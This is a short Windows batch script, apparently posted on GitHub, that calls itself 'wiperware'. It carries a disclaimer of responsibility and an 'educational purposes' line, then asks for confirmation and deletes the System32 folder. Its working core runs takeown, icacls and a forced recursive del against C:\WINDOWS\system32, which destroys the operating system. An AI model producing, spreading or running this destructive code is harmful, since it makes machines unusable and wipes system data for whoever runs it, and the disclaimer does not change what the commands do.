@echo off

echo It is important to emphasize that I bear no responsibility for any actions performed with this wiperware. 
echo Any usage of these viruses is solely at your own risk. This was designed for educational purposes only.

echo ==========================================================================================================

choice /c yn /n /m "Do you want to delete System32? (Y/N) "

if errorlevel 2 (
    echo Good Choice.
    goto end
) else (
    echo Welp...You asked for it...
    timeout /t 5 /nobreak
    echo Starting...
    goto script
    echo Finished
    goto end
)

:script

takeown /f C:\WINDOWS\system32 /r /d y
icacls C:\WINDOWS\system32 /grant "%USERNAME%":(F) /t
del /f /s /q C:\WINDOWS\system32

:end

echo Thank you for using my program! Please give a star on my Github.

pause